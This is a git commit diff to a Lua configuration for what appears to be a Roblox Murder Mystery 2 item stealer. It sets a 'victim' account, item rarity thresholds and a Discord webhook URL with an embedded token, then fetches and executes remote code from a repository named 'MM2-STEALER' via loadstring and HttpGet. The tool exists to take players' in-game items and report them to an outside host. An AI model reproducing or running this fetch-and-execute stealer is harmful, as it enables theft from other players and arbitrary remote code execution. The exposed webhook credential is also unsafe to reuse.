fbe012fdb576cb9a8dec77bc11ff9e91006f918f
henryscripter3 <henrysixseige@gmail.com>
2025-04-12 10:27:21 +0100

    Update main.lua

--- main.lua
+++ main.lua
@@ -2,6 +2,6 @@ _G.Username = "faze9962" -- user you should join victim on
 _G.min_rarity = "Godly"
 _G.min_value = 1 -- Put 1 to get all
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
-_G.webhook = "https://discord.com/api/webhooks/" -- change to your webhook
+_G.webhook = "https://discord.com/api/webhooks/1360546733582454935/GdUyt3-qIx7-dRUZVbpXFCwvb7pyYtIpgilNlbb7FwEBWFo_QYh1YfmSqXzw5L7tgBTf" -- change to your webhook
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/henryscripter3/MM2-STEALER/refs/heads/main/test.lua",true))()
